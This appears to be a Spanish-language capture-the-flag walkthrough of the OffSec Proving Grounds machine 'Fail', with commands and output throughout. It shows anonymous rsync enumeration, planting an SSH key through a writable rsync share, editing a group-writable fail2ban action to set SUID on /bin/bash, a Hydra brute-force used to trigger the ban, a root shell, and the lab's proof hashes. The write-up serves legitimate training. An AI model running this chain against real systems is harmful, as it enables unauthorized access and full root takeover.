---
title: "Fail"
date: 2026-07-15
platform: "Offsec"
difficulty: "Medium"     # Easy, Medium, Hard, Insane
os: "Linux"            # Linux, Windows
tags: ["CTF","Offsec","Linux", "Medium"]
skills: ["RSYNC", "FAIL2BAN"]
---

En este walkthrough, muestro cómo obtuve acceso completo a la máquina Fail de OffSec Proving Grounds.

## Objetivos de aprendizaje

- Pentesting RSync
- Acceso de escritura a los archivos de configuración de fail2ban

## Escaneo con Nmap

```bash
sudo nmap -sSCV -vvv -n -Pn -p- --min-rate 5000 192.168.66.126

<SNIP>

PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
873/tcp open  rsync   syn-ack ttl 63 (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>

```

## Enumeración de servicios

### RSYNC

Pudimos listar las carpetas compartidas de forma anónima.

```bash
rsync --list-only rsync://192.168.66.126
fox             fox home
```

Esto parecía ser el directorio home del usuario **fox**.


## Explotación

Copiamos la carpeta compartida de forma local para buscar credenciales u otra información útil.

```bash
rsync -av rsync://192.168.66.126/fox fox_home/
receiving incremental file list
created directory fox_home
./
.bash_history -> /dev/null
.bash_logout
.bashrc
.profile

sent 87 bytes  received 4,828 bytes  9,830.00 bytes/sec
total size is 4,562  speedup is 0.93
```

No había nada interesante allí. Sin embargo, intentamos escribir nuestra clave pública de SSH en el directorio `.ssh/` como `authorized_keys`, lo que nos permitiría conectarnos por SSH usando nuestra clave privada.

```bash
# No se pudo conectar con la clave privada RSA y se mostró esta advertencia (ED25519 key fingerprint is: SHA256:mqPCrimr9j626KOGoHM+qxgHUOYD4pu1+4KzhIvu5uA This key is not known by any other names.).
ssh-keygen -t ed25519

<SNIP>

cp id_ed25519.pub authorized_keys
```

Tras generar la clave privada, subimos el directorio `.ssh`.

```bash
rsync -av .ssh rsync://192.168.66.126/fox/    
sending incremental file list
.ssh/
.ssh/authorized_keys
.ssh/id_ed25519
.ssh/id_ed25519.pub
.ssh/id_rsa
.ssh/id_rsa.pub
.ssh/known_hosts
.ssh/agent/
.ssh/agent/s.RDJpj98jBr.agent.wBO7kP4Ohp
```

Luego nos conectamos por SSH como fox.

```bash
ssh -i id_ed25519 fox@192.168.66.126

<SNIP>

$ hostname
fail
$ whoami
fox
```

## Post-explotación

El usuario **fox** pertenece al grupo **fail2ban**, lo cual es poco común.

```bash
$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
```

Enumeramos qué archivos podían ser modificados por los miembros de ese grupo.

```bash
$ find / -group fail2ban -writable 2>/dev/null
/etc/fail2ban/action.d
/etc/fail2ban/action.d/firewallcmd-ipset.conf
/etc/fail2ban/action.d/nftables-multiport.conf
/etc/fail2ban/action.d/firewallcmd-multiport.conf
/etc/fail2ban/action.d/mail-whois.conf
/etc/fail2ban/action.d/ufw.conf
/etc/fail2ban/action.d/sendmail-common.conf
/etc/fail2ban/action.d/hostsdeny.conf
/etc/fail2ban/action.d/iptables-common.conf
/etc/fail2ban/action.d/iptables.conf
/etc/fail2ban/action.d/iptables-ipset-proto4.conf
/etc/fail2ban/action.d/shorewall.conf
/etc/fail2ban/action.d/shorewall-ipset-proto6.conf
/etc/fail2ban/action.d/sendmail-buffered.conf
/etc/fail2ban/action.d/abuseipdb.conf
/etc/fail2ban/action.d/sendmail-whois-ipmatches.conf
/etc/fail2ban/action.d/mail.conf
/etc/fail2ban/action.d/sendmail-whois-ipjailmatches.conf
/etc/fail2ban/action.d/nftables-allports.conf
/etc/fail2ban/action.d/npf.conf
/etc/fail2ban/action.d/apf.conf
/etc/fail2ban/action.d/badips.conf
/etc/fail2ban/action.d/iptables-multiport-log.conf
/etc/fail2ban/action.d/cloudflare.conf
/etc/fail2ban/action.d/sendmail-geoip-lines.conf
/etc/fail2ban/action.d/ipfilter.conf
/etc/fail2ban/action.d/xarf-login-attack.conf
/etc/fail2ban/action.d/sendmail-whois.conf
/etc/fail2ban/action.d/osx-ipfw.conf
/etc/fail2ban/action.d/route.conf
/etc/fail2ban/action.d/mail-buffered.conf
/etc/fail2ban/action.d/firewallcmd-common.conf
/etc/fail2ban/action.d/iptables-xt_recent-echo.conf
/etc/fail2ban/action.d/firewallcmd-rich-rules.conf
/etc/fail2ban/action.d/iptables-multiport.conf
/etc/fail2ban/action.d/firewallcmd-allports.conf
/etc/fail2ban/action.d/iptables-ipset-proto6.conf
/etc/fail2ban/action.d/sendmail-whois-lines.conf
/etc/fail2ban/action.d/iptables-allports.conf
/etc/fail2ban/action.d/badips.py
/etc/fail2ban/action.d/complain.conf
/etc/fail2ban/action.d/netscaler.conf
/etc/fail2ban/action.d/sendmail-whois-matches.conf
/etc/fail2ban/action.d/dummy.conf
/etc/fail2ban/action.d/sendmail.conf
/etc/fail2ban/action.d/nsupdate.conf
/etc/fail2ban/action.d/firewallcmd-rich-logging.conf
/etc/fail2ban/action.d/pf.conf
/etc/fail2ban/action.d/helpers-common.conf
/etc/fail2ban/action.d/nginx-block-map.conf
/etc/fail2ban/action.d/smtp.py
/etc/fail2ban/action.d/mail-whois-common.conf
/etc/fail2ban/action.d/dshield.conf
/etc/fail2ban/action.d/nftables-common.conf
/etc/fail2ban/action.d/mynetwatchman.conf
/etc/fail2ban/action.d/blocklist_de.conf
/etc/fail2ban/action.d/bsd-ipfw.conf
/etc/fail2ban/action.d/iptables-ipset-proto6-allports.conf
/etc/fail2ban/action.d/ipfw.conf
/etc/fail2ban/action.d/symbiosis-blacklist-allports.conf
/etc/fail2ban/action.d/mail-whois-lines.conf
/etc/fail2ban/action.d/osx-afctl.conf
/etc/fail2ban/action.d/firewallcmd-new.conf
/etc/fail2ban/action.d/iptables-new.conf
```

La configuración principal se encuentra en `/etc/fail2ban/jail.conf`, y vimos que se estaba haciendo referencia a `iptables-multiport.conf`.

```bash
$ cat jail.conf

<SNIP>

banaction = iptables-multiport

<SNIP>
```

Modificamos `iptables-multiport.conf` para que estableciera el bit SUID en `/bin/bash` cuando se prohibiera una IP.

```bash
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = chmod +s /bin/bash
```

Probamos esto prohibiendo nuestra propia IP, por ejemplo, mediante un ataque con `Hydra`.

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p hola ssh://192.168.66.126
```

Confirmamos que `/bin/bash` tenía el bit SUID activado.

```bash
$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
$ /bin/bash -p
bash-5.0# whoami
root
```

**Teníamos acceso root**

## Pruebas


{{< ctf-proofs title="User" >}}

```text
a7fb0a5e8f70cc6eea09eae8af77e669
```

{{< /ctf-proofs >}}

{{< ctf-proofs title="Root" >}}

```text
5595c09f37ddef6b985bab6aa05e31e3
```

{{< /ctf-proofs >}}
